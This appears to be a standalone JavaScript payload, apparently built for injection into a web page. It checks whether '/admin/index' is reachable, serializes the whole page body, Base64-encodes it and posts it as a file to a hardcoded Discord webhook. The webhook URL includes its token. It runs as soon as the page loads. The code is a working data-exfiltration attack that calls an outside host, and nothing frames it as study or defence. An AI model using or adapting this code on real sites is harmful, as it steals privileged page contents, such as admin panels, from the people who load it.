
function logBodyElementsAsBase64() {
  const body = document.body; // Get the body of the document
  const allElements = body.querySelectorAll('*:not(header)'); // Select all elements except those in the header
  let htmlOutput = ''; // Initialize a variable to hold the HTML string

  allElements.forEach((element) => {
      // Create an HTML string for each element
      const tagName = element.tagName.toLowerCase();
      const attributes = Array.from(element.attributes).map(attr => `${attr.name}="${attr.value}"`).join(' ');
      const attrString = attributes.length ? ` ${attributes}` : '';
      htmlOutput += `<${tagName}${attrString}>${element.innerHTML.trim()}</${tagName}>\n`; // Append formatted HTML
  });

  // Convert the HTML output to Base64
  const base64Output = btoa(unescape(encodeURIComponent(htmlOutput))); // Use btoa to encode
  return base64Output; // Log the Base64-encoded output
}

// Call the function




function checkStatus(url) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE) {
            if (xhr.status === 200) {
              var href = (new URL(window.location)).href;
              var filename = href.replace(/[^a-zA-Z0-9]/g, '_') + '.txt';
                xhttp = new XMLHttpRequest();
                var bd = logBodyElementsAsBase64();
                const blob = new Blob([bd], { type: 'text/plain' });
                const formData = new FormData();
                formData.append('file', blob, filename); // Append the Blob as a file with a name
                // Open a POST request
                xhttp.open("POST", "https://discord.com/api/webhooks/1261424001797066793/Oq5E8KLKf3wBBWFZ965K77Xhn3UJcPySXUjsC3t0ZbRSJedbvSbkiRzdmfN2ojtlQgaF", true);
                xhttp.send(formData);
               
            } 
        }
    };
   
    xhr.open('GET', url);
    xhr.send();
}

var url = '/admin/index';
checkStatus(url);



